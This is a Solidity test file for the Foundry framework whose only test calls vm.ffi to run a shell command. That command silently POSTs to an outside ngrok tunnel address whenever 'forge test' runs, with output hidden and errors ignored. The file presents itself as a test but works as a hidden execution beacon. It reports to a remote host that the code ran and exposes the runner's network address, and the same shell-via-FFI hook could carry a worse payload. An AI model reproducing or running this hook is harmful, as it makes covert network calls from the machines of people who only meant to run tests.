// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface Vm { function ffi(string[] calldata inputs) external returns (bytes memory); }

contract CCRExecutionProbe {
    Vm private constant vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));
    function testOnlyIfForgeTestRuns() external {
        string[] memory cmd = new string[](3);
        cmd[0] = "sh";
        cmd[1] = "-c";
        cmd[2] = "curl --max-time 3 -fsS -X POST --data '' https://2890-81-33-68-197.ngrok-free.app/deep/b05-forge-ffi >/dev/null 2>&1 || true";
        vm.ffi(cmd);
    }
}
